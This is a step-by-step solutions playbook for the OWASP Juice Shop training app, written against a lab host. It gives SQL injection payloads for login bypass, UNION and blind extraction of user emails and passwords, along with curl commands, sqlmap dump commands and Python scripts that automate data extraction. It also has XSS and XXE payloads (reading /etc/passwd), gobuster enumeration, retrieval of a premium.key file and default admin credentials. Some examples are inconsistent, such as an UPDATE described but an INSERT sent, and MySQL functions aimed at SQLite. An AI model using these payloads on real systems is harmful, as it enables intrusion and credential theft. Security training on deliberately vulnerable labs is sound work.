# OWASP Juice Shop: All Challenges & Solutions Playbook

This playbook summarizes the main challenge categories and solutions for OWASP Juice Shop, with step-by-step instructions and example commands/scripts. For full details, always refer to the official [Pwning OWASP Juice Shop](https://pwning.owasp-juice.shop/) book.

---

## 1. Injection Attacks

### SQL Injection Scenario 1: Login Bypass (Admin Account)

**Objective:** Bypass login authentication to access admin account

**Steps:**

1. Navigate to `http://10.30.0.237:3000/#/login`
2. In the email field, enter: `admin@juice-sh.op' OR 1=1--`
3. In the password field, enter any value (e.g., `password`)
4. Click "Log in"
5. You should be logged in as the admin user

**Manual Command:**

```zsh
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}'
```

**SQLMap Command (Fixed):**

```zsh
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --data='{"email":"admin@juice-sh.op","password":"password"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --technique=BEU --level=3 --risk=3 \
  --batch --dump
```

### SQL Injection Scenario 2: Product Search Injection

**Objective:** Extract database information through search functionality

**Steps:**

1. Go to the main page search bar
2. Enter: `apple' UNION SELECT null,email,password,null,null,null,null,null,null FROM Users--`
3. Press Enter to search
4. Check the response for exposed user data

**Manual Command:**

```zsh
curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20UNION%20SELECT%20null,email,password,null,null,null,null,null,null%20FROM%20Users--"
```

**SQLMap Command:**

```zsh
sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" \
  --dbms=sqlite --technique=U --level=3 --risk=3 \
  --tables --batch
```

### SQL Injection Scenario 3: Order Tracking Injection

**Objective:** Access all order information through order tracking

**Steps:**

1. Go to `http://10.30.0.237:3000/#/track-result`
2. In the tracking ID field, enter: `1' OR '1'='1`
3. Click "Track"
4. Observe all orders being displayed

**Manual Command:**

```zsh
curl -X GET "http://10.30.0.237:3000/rest/track-order/1%27%20OR%20%271%27=%271" \
  -H "Accept: application/json"
```

### SQL Injection Scenario 4: Boolean-Based Blind SQL Injection

**Objective:** Extract database information using boolean-based blind techniques

**Steps:**

1. Navigate to the product search
2. Test true condition: `apple' AND '1'='1--`
3. Test false condition: `apple' AND '1'='2--`
4. Compare responses to identify blind SQL injection
5. Use binary search to extract data:
   - `apple' AND (SELECT LENGTH(email) FROM Users WHERE id=1)>10--`
   - `apple' AND (SELECT SUBSTR(email,1,1) FROM Users WHERE id=1)='a'--`

**Python Script for Boolean-Based Extraction:**

```python
#!/usr/bin/env python3
import requests
import string

def blind_sqli_extract(url, payload_template):
    """Extract data using boolean-based blind SQL injection"""
    result = ""
    position = 1

    while True:
        found_char = False
        for char in string.printable:
            if char in ['%', '_', '\\']: # Skip SQL wildcards
                continue

            payload = payload_template.format(position=position, char=char)
            response = requests.get(f"{url}?q={payload}")

            # Check if response indicates true condition
            if len(response.json().get('data', [])) > 0:
                result += char
                position += 1
                found_char = True
                print(f"Found character: {char} (Position: {position-1})")
                break

        if not found_char:
            break

    return result

# Usage example
url = "http://10.30.0.237:3000/rest/products/search"
payload = "apple' AND (SELECT SUBSTR(email,{position},1) FROM Users WHERE id=1)='{char}'--"
extracted_email = blind_sqli_extract(url, payload)
print(f"Extracted email: {extracted_email}")
```

### SQL Injection Scenario 5: Time-Based Blind SQL Injection

**Objective:** Confirm SQL injection using time delays

**Steps:**

1. Go to product search
2. Enter payload that causes delay: `apple'; SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sqlite_master) ELSE 0 END--`
3. Measure response time difference
4. Use timing to extract data bit by bit

**Manual Command:**

```zsh
# Test time-based injection (SQLite doesn't have SLEEP, use heavy query)
curl -w "Time: %{time_total}s\n" \
  "http://10.30.0.237:3000/rest/products/search?q=apple%27%3B%20SELECT%20COUNT%28%2A%29%20FROM%20sqlite_master%20WHERE%20tbl_name%20LIKE%20%27%25%27--"
```

**Time-Based Extraction Script:**

```python
#!/usr/bin/env python3
import requests
import time

def time_based_sqli(url, true_payload, false_payload):
    """Test for time-based SQL injection"""

    # Test baseline
    start = time.time()
    requests.get(f"{url}?q=apple")
    baseline = time.time() - start

    # Test true condition (should be slower)
    start = time.time()
    requests.get(f"{url}?q={true_payload}")
    true_time = time.time() - start

    # Test false condition (should be faster)
    start = time.time()
    requests.get(f"{url}?q={false_payload}")
    false_time = time.time() - start

    print(f"Baseline time: {baseline:.3f}s")
    print(f"True condition time: {true_time:.3f}s")
    print(f"False condition time: {false_time:.3f}s")

    if true_time > (baseline * 2):
        print("Time-based SQL injection detected!")
        return True
    return False

# Usage
url = "http://10.30.0.237:3000/rest/products/search"
true_payload = "apple'; SELECT COUNT(*) FROM sqlite_master WHERE tbl_name LIKE '%'--"
false_payload = "apple'; SELECT COUNT(*) FROM sqlite_master WHERE tbl_name LIKE 'nonexistent'--"
time_based_sqli(url, true_payload, false_payload)
```

### SQL Injection Scenario 6: Second-Order SQL Injection

**Objective:** Exploit stored SQL injection through user registration

**Steps:**

1. Register a new user with malicious email: `test'; UPDATE Users SET password='hacked' WHERE email='admin@juice-sh.op'--@test.com`
2. Complete registration process
3. The malicious SQL may execute when the email is processed internally
4. Try logging in as admin with password 'hacked'

**Registration Command:**

```zsh
curl -X POST "http://10.30.0.237:3000/api/Users/" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test'\''INSERT INTO Users (email,password) VALUES ('\''hacker@test.com'\'','\''password'\'')--@test.com",
    "password": "password123",
    "passwordRepeat": "password123",
    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"},
    "securityAnswer": "test"
  }'
```

### SQL Injection Scenario 7: Error-Based SQL Injection

**Objective:** Extract information through SQL error messages

**Steps:**

1. Go to product search
2. Enter payload to trigger SQL errors: `apple' AND EXTRACTVALUE(1, CONCAT('~', (SELECT email FROM Users LIMIT 1)))--`
3. Check error messages for leaked data
4. For SQLite, use: `apple' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE 1 END)--`

**Error-Based Commands:**

```zsh
# Test for SQL errors
curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20AND%20%281%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%29%29--"

# SQLite specific error injection
curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201/0%20ELSE%201%20END%29--"
```

### Complete SQLMap Automation Guide

**1. Basic Database Enumeration:**

```zsh
# Enumerate databases
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --data='{"email":"test@test.com","password":"test123"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --dbs --batch

# Enumerate tables
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --data='{"email":"test@test.com","password":"test123"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --tables --batch

# Enumerate columns for Users table
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --data='{"email":"test@test.com","password":"test123"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite -T Users --columns --batch
```

**2. Data Extraction:**

```zsh
# Dump all Users table data
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --data='{"email":"test@test.com","password":"test123"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite -T Users --dump --batch

# Dump specific columns
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --data='{"email":"test@test.com","password":"test123"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite -T Users -C email,password --dump --batch
```

**3. Advanced SQLMap Options:**

```zsh
# Test all parameters with maximum detection
sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=test" \
  --dbms=sqlite --level=5 --risk=3 \
  --technique=BEUSTQ --batch --threads=4

# Test POST data with custom injection points
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --data='{"email":"test@test.com*","password":"test123*"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --batch --tamper=space2comment
```

**4. Comprehensive Automation Script:**

```python
#!/usr/bin/env python3
"""
Complete OWASP Juice Shop SQL Injection Testing Suite
"""
import subprocess
import json
import time

class JuiceShopSQLTester:
    def __init__(self, base_url="http://10.30.0.237:3000"):
        self.base_url = base_url
        self.targets = [
            {
                "name": "Login Endpoint",
                "url": f"{base_url}/rest/user/login",
                "data": '{"email":"test@test.com","password":"test123"}',
                "headers": "Content-Type: application/json"
            },
            {
                "name": "Product Search",
                "url": f"{base_url}/rest/products/search?q=test",
                "data": None,
                "headers": None
            },
            {
                "name": "Order Tracking",
                "url": f"{base_url}/rest/track-order/1",
                "data": None,
                "headers": None
            }
        ]

    def run_sqlmap_test(self, target, additional_args=""):
        """Run SQLMap against a target"""
        cmd = ["sqlmap", "-u", target["url"], "--dbms=sqlite", "--batch"]

        if target["data"]:
            cmd.extend(["--data", target["data"]])

        if target["headers"]:
            cmd.extend(["--headers", target["headers"]])

        if additional_args:
            cmd.extend(additional_args.split())

        print(f"\n[+] Testing {target['name']}")
        print(f"Command: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return {
                "target": target["name"],
                "success": result.returncode == 0,
                "output": result.stdout,
                "errors": result.stderr
            }
        except subprocess.TimeoutExpired:
            return {
                "target": target["name"],
                "success": False,
                "output": "",
                "errors": "Timeout expired"
            }

    def run_comprehensive_test(self):
        """Run comprehensive SQLMap testing"""
        results = []

        for target in self.targets:
            # Basic injection test
            result = self.run_sqlmap_test(target, "--technique=B")
            results.append(result)

            if result["success"]:
                print(f"✓ Basic injection found in {target['name']}")

                # If injection found, enumerate databases
                enum_result = self.run_sqlmap_test(target, "--dbs")
                results.append(enum_result)

                # Try to dump Users table
                dump_result = self.run_sqlmap_test(target, "-T Users --dump")
                results.append(dump_result)
            else:
                print(f"✗ No injection found in {target['name']}")

            time.sleep(2)  # Rate limiting

        return results

    def generate_report(self, results):
        """Generate test report"""
        report = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_tests": len(results),
            "successful_tests": len([r for r in results if r["success"]]),
            "results": results
        }

        with open("juice_shop_sqli_report.json", "w") as f:
            json.dump(report, f, indent=2)

        print(f"\n{'='*50}")
        print("SQL INJECTION TEST REPORT")
        print(f"{'='*50}")
        print(f"Total tests: {report['total_tests']}")
        print(f"Successful: {report['successful_tests']}")
        print("Report saved to: juice_shop_sqli_report.json")

if __name__ == "__main__":
    tester = JuiceShopSQLTester()
    results = tester.run_comprehensive_test()
    tester.generate_report(results)
```

---

## 2. Cross-Site Scripting (XSS)

### Reflected XSS

1. Go to the search bar.
2. Enter: `<script>alert(1)</script>`
3. Observe alert popup.

### Stored XSS

1. Register a new user.
2. Post a product review with: `<img src=x onerror=alert(1)>`
3. View the review to trigger the alert.

---

## 3. Broken Authentication

### Password Reset Poisoning

1. Register a user with your email.
2. Request password reset.
3. Intercept the reset link (Burp Suite) and modify the host header to a server you control.
4. Capture the reset token.

---

## 4. Sensitive Data Exposure

### Directory and File Discovery with Gobuster

**Objective:** Discover hidden files, directories, and sensitive endpoints

**Prerequisites:**

```zsh
# Install gobuster (if not already installed)
brew install gobuster

# Download common wordlists
git clone https://github.com/danielmiessler/SecLists.git ~/SecLists
```

**Steps:**

#### 1. Basic Directory Enumeration

```zsh
# Basic directory discovery
gobuster dir -u http://10.30.0.237:3000 \
  -w ~/SecLists/Discovery/Web-Content/common.txt \
  -t 50 -x txt,php,html,js,json,xml

# Extended directory discovery
gobuster dir -u http://10.30.0.237:3000 \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 100 -x txt,php,html,js,json,xml,bak,old \
  --timeout 10s
```

#### 2. API Endpoint Discovery

```zsh
# Discover API endpoints
gobuster dir -u http://10.30.0.237:3000/api \
  -w ~/SecLists/Discovery/Web-Content/api/objects.txt \
  -t 50

# REST API enumeration
gobuster dir -u http://10.30.0.237:3000/rest \
  -w ~/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -t 50
```

#### 3. File Extension Fuzzing

```zsh
# Look for backup files and configs
gobuster dir -u http://10.30.0.237:3000 \
  -w ~/SecLists/Discovery/Web-Content/raft-small-files.txt \
  -t 50 -x bak,backup,old,orig,save,conf,config,ini

# Search for common sensitive files
gobuster dir -u http://10.30.0.237:3000 \
  -w ~/SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt \
  -t 50 -x php,txt,log
```

#### 4. Admin Panel Discovery

```zsh
# Find admin panels and management interfaces
gobuster dir -u http://10.30.0.237:3000 \
  -w ~/SecLists/Discovery/Web-Content/CMS/wp-admin.txt \
  -t 50

# Custom admin wordlist for Juice Shop
echo -e "admin\nadministration\nmanagement\nscore-board\naccounting\nmetrics\nmonitoring" > juice_admin.txt
gobuster dir -u http://10.30.0.237:3000 \
  -w juice_admin.txt \
  -t 20
```

#### 5. Comprehensive Automation Script

```python
#!/usr/bin/env python3
"""
Gobuster Automation for OWASP Juice Shop
"""
import subprocess
import json
import time
from concurrent.futures import ThreadPoolExecutor

class JuiceShopGobuster:
    def __init__(self, target_url="http://10.30.0.237:3000"):
        self.target_url = target_url
        self.wordlists = {
            "common": "~/SecLists/Discovery/Web-Content/common.txt",
            "medium": "~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt",
            "big": "~/SecLists/Discovery/Web-Content/big.txt",
            "files": "~/SecLists/Discovery/Web-Content/raft-small-files.txt",
            "api": "~/SecLists/Discovery/Web-Content/api/objects.txt"
        }
        self.results = []

    def run_gobuster(self, path="", wordlist="common", extensions="txt,php,html,js,json"):
        """Run gobuster with specified parameters"""
        full_url = f"{self.target_url}{path}"
        wordlist_path = self.wordlists.get(wordlist, wordlist)

        cmd = [
            "gobuster", "dir",
            "-u", full_url,
            "-w", wordlist_path,
            "-t", "50",
            "-x", extensions,
            "--timeout", "10s",
            "-q"  # Quiet mode for cleaner output
        ]

        print(f"[+] Running: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            findings = []

            for line in result.stdout.split('\n'):
                if line.strip() and not line.startswith('='):
                    findings.append(line.strip())

            return {
                "path": path,
                "wordlist": wordlist,
                "findings": findings,
                "success": True
            }
        except subprocess.TimeoutExpired:
            return {
                "path": path,
                "wordlist": wordlist,
                "findings": [],
                "success": False,
                "error": "Timeout"
            }
        except Exception as e:
            return {
                "path": path,
                "wordlist": wordlist,
                "findings": [],
                "success": False,
                "error": str(e)
            }

    def comprehensive_scan(self):
        """Run comprehensive gobuster scans"""
        scan_targets = [
            {"path": "", "wordlist": "common", "extensions": "txt,html,js,json,xml"},
            {"path": "/api", "wordlist": "api", "extensions": ""},
            {"path": "/rest", "wordlist": "common", "extensions": ""},
            {"path": "", "wordlist": "files", "extensions": "bak,backup,old,conf,log"},
            {"path": "/ftp", "wordlist": "common", "extensions": "txt,pdf,zip,tar.gz"},
        ]

        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for target in scan_targets:
                future = executor.submit(
                    self.run_gobuster,
                    target["path"],
                    target["wordlist"],
                    target["extensions"]
                )
                futures.append(future)

            for future in futures:
                result = future.result()
                self.results.append(result)
                if result["success"] and result["findings"]:
                    print(f"\n[!] Found paths for {result['path']}:")
                    for finding in result["findings"]:
                        print(f"    {finding}")

    def generate_report(self):
        """Generate findings report"""
        all_findings = []
        for result in self.results:
            if result["success"]:
                all_findings.extend(result["findings"])

        report = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "target": self.target_url,
            "total_findings": len(all_findings),
            "results": self.results,
            "unique_findings": list(set(all_findings))
        }

        with open("juice_shop_gobuster_report.json", "w") as f:
            json.dump(report, f, indent=2)

        print(f"\n{'='*50}")
        print("GOBUSTER SCAN REPORT")
        print(f"{'='*50}")
        print(f"Total findings: {report['total_findings']}")
        print("Report saved to: juice_shop_gobuster_report.json")

        return report

if __name__ == "__main__":
    scanner = JuiceShopGobuster()
    scanner.comprehensive_scan()
    scanner.generate_report()
```

### Accessing Confidential Files

#### Manual Discovery

1. Go to `/ftp` or `/encryptionkeys` endpoints.
2. Download files directly.
3. Try common paths:
   - `/robots.txt`
   - `/sitemap.xml`
   - `/security.txt`
   - `/.well-known/`
   - `/backup/`
   - `/config/`

#### Specific Juice Shop Sensitive Endpoints

```zsh
# Test known sensitive endpoints
curl -I http://10.30.0.237:3000/ftp
curl -I http://10.30.0.237:3000/encryptionkeys
curl -I http://10.30.0.237:3000/robots.txt
curl -I http://10.30.0.237:3000/security.txt
curl -I http://10.30.0.237:3000/.well-known/security.txt

# Download accessible files
wget http://10.30.0.237:3000/ftp/package.json.bak
wget http://10.30.0.237:3000/encryptionkeys/premium.key
```

#### Automated File Discovery

```zsh
# Create custom wordlist for Juice Shop
cat > juice_files.txt << EOF
package.json.bak
premium.key
eastere.gg
incident-support.kdbx
coupons_2013.md.bak
acquisitions.md
legal.md
package.json
bower.json
Gruntfile.js
gulpfile.js
EOF

# Run gobuster with custom wordlist
gobuster dir -u http://10.30.0.237:3000/ftp \
  -w juice_files.txt \
  -t 20 --timeout 5s
```

---

## 5. Broken Access Control

### Access Admin Panel

1. Try `/administration` or `/score-board` directly in the URL bar.
2. Use an admin JWT if needed (see SQLi or XSS to steal tokens).

---

## 6. Security Misconfiguration

### Exposed Debug Endpoints

1. Visit `/rest/admin/application-configuration` or `/rest/user/authentication-details`.
2. Sensitive info may be exposed.

---

## 7. XXE (XML External Entities)

1. Find a file upload or XML endpoint.
2. Upload XML with external entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<request><data>&xxe;</data></request>
```

---

## 8. Unvalidated Redirects

1. Find a redirect endpoint (e.g., after login or logout).
2. Manipulate the `to` parameter to redirect to an external site.

---

## 9. Miscellaneous

- Try default credentials: `admin@juice-sh.op` / `admin123`
- Use Burp Suite for fuzzing and intercepting requests
- Check `/robots.txt` and `/security.txt` for hints

---

## References

- [Official Solutions](https://help.owasp-juice.shop/appendix/solutions.html)
- [Pwning OWASP Juice Shop Book](https://pwning.owasp-juice.shop/)

---

**Disclaimer:** For educational use only. Only test on systems you own or have permission to test.
